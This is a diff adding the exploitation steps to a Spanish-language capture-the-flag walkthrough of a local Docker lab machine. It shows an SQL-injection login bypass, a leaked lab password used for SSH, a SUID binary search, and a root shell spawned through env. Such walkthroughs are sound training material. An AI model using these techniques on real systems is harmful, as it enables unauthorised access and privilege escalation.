@@ -69,9 +69,54 @@ PORT   STATE SERVICE REASON         VERSION
 MAC Address: 02:42:AC:11:00:02 (Unknown)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
+## Explotación.
 Vamos directamente a la enumerar el puerto 80 desde el navegador y vemos que hay un formulario de login. Probamos una inyección sql.
 ```bash
 User: admin' OR 1 = 1 -- -
 Password: hola
 ```
+Y direcctamente nos lleva a una página con un mensaje que contiene el usuario y contraseña.
 
+```bash
+Bienvenido Dylan! Has insertado correctamente tu contraseña: KJSDFG789FGSDF78
+```
+Teniendo el puerto 22 (SSH) abierto probamos el usuario y contraseña que nos han proporcionado y entramos a la máquina.
+```bash
+❯ ssh dylan@172.17.0.2
+dylan@172.17.0.2's password: 
+Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 6.5.0-kali3-amd64 x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Last login: Thu May 16 16:44:37 2024 from 172.17.0.1
+dylan@b5df33a8267a:~$ 
+```
+## Excalada de privilegios.
+Lo primero es buscar binarios con permisos SUID para hacer la escalada.
+```bash
+find / -perm -4000 2>/dev/null
+```
+```bash
+dylan@b5df33a8267a:~$ find / -perm -4000 2>/dev/null
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/mount
+/usr/bin/newgrp
+/usr/bin/su
+/usr/bin/env
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/umount
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+```
+Si vamos a [GTOFBins](https://gtfobins.github.io/gtfobins/env/), vemos que con el binario **/usr/bin/env** podemos ejecutar una bash con privilegios.
+```bash
+/usr/bin/env /bin/sh -p
+```
